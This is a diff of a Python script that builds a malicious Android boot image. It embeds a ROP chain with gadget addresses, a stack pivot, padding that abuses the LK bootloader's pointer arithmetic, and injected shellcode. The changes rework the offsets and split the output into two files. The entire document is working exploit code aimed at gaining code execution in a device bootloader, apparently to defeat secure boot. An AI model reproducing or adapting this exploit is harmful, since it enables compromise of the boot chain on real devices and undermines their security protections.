@@ -1,7 +1,9 @@
+#!/usr/bin/env python3
 import sys
 import struct
 
 base = 0x4BD00000
+forced_addr = 0x45000000
 
 # b5a4:       e8bdd1df        pop     {r0, r1, r2, r3, r4, r6, r7, r8, ip, lr, pc}
 pop_r0_r1_r2_r3_r4_r6_r7_r8_ip_lr_pc = base + 0xb5a4
@@ -16,41 +18,41 @@ cache_func = base + 0x31444
 
 test = base + 0x185 # prints "Error, the pointer of pidme_data is NULL."
 
-forced_addr = 0x45000000 
-#inject_addr = base + 0x5C000
-inject_addr = forced_addr + 0x10 + 0x1000000
-inject_sz = 0x1000
-
-shellcode_addr = forced_addr + 0x100 + 0x1000000
-#shellcode_sz = 0x200 # TODO: check size
 shellcode_sz = 0x1000 # TODO: check size
 
-# ldmda   r3, {r2, r3, r4, r5, r8, fp, sp, lr, pc}
-#pivot = 0x4BD43320
+lk_offset = base - forced_addr
+
+#inject_offset = 0x1000000
+inject_offset = lk_offset - shellcode_sz - 0x100
+
+inject_addr = forced_addr + inject_offset + 0x10
+shellcode_addr = forced_addr + inject_offset + 0x100
+
 # 3088:       0913f04f        ldmdbeq r3, {r0, r1, r2, r3, r6, ip, sp, lr, pc}
 pivot = base + 0x3088;
 
-lk_offset = 0x5C0
+ptr_offset = 0x3C0
 
-lk_r3_target = 0x46000020
-lk_ptr_target = 0x46000024
+r3_pc = base + (ptr_offset - 0x18) 
+ptr_pc = base + (ptr_offset - 0x08)
 
-r3_pc = base + (lk_offset - 0x218) 
-ptr_pc = base + (lk_offset - 0x208)
+lk_r3_target = inject_addr + 0x10
+lk_ptr_target = inject_addr + 0x14
+
 
 def main():
     with open(sys.argv[1], "rb") as fin:
-        #orig = fin.read(0x400)
-        #fin.seek(0x800)
-        orig = fin.read(lk_offset)
+        orig = fin.read(ptr_offset + 0x200)
+        fin.seek(ptr_offset + 0x200 + 0x8)
+        pad_len = ((len(orig) // 0x200) + 1) * 0x200
+        orig2 = fin.read(pad_len - len(orig) - 0x8)
 
     hdr = bytes.fromhex("414E44524F494421")
-    hdr += struct.pack("<II", 0x6D00384, forced_addr)
+    hdr += struct.pack("<II", lk_offset + ptr_offset, forced_addr)
     hdr += bytes.fromhex("0000000000000044000000000000F0400000004840000000000000002311040E00000000000000000000000000000000")
     hdr += b"bootopt=64S3,32N2,32N2" # This is so that TZ still inits, but LK thinks kernel is 32-bit - need to fix too!
     hdr += b"\x00" * 0xA
-    #hdr += b"\x00" * 0x10
-    hdr += b"\x00" * 0x1000000
+    hdr += b"\x00" * inject_offset
     hdr += struct.pack("<II", inject_addr + 0x40, pivot) # r3, pc (+0x40 because gadget arg points at the end of ldm package)
     hdr += b"\x00" * 0x1C
     hdr += struct.pack("<III", inject_addr + 0x50, 0, pop_pc) # sp, lr, pc
@@ -79,9 +81,8 @@ def main():
     chain_bin = b"".join([struct.pack("<I", word) for word in chain])
     hdr += chain_bin
 
-    want_len = shellcode_addr - inject_addr + 0x40 + 0x10 
-    #hdr += b"\x00" * (want_len - len(hdr))
-    hdr += b"\x00" * 0x68
+    want_len = shellcode_addr - inject_addr + 0x40 + 0x10
+    hdr += b"\x00" * ((want_len + inject_offset) - len(hdr))
 
     with open(sys.argv[2], "rb") as fin:
         shellcode = fin.read()
@@ -91,16 +92,21 @@ def main():
 
     hdr += shellcode
 
-    hdr += b"\x00" * (0x400 - len(hdr))
-
-    #hdr += b"\x00" * ((0x6D00040 - len(hdr) - 0x200) + 0x10)
-    hdr += b"\x00" * (0x6D00040 - len(hdr) - 0x200)
+    hdr += b"\x00" * (lk_offset + 0x40 - len(hdr) - 0x200)
 
     hdr += orig
     hdr += struct.pack("<ii", lk_r3_target - r3_pc, lk_ptr_target - ptr_pc)
+    hdr += orig2
 
-    with open(sys.argv[3], "wb") as fout:
-        fout.write(hdr)
+    payload_block = (inject_offset // 0x200) * 0x200
+    if sys.argv[4]:
+        with open(sys.argv[3], "wb") as fout:
+            fout.write(hdr[:0x60])
+        with open(sys.argv[4], "wb") as fout:
+            fout.write(hdr[payload_block:])
+    else:
+        with open(sys.argv[3], "wb") as fout:
+            fout.write(hdr)
 
 
 if __name__ == "__main__":
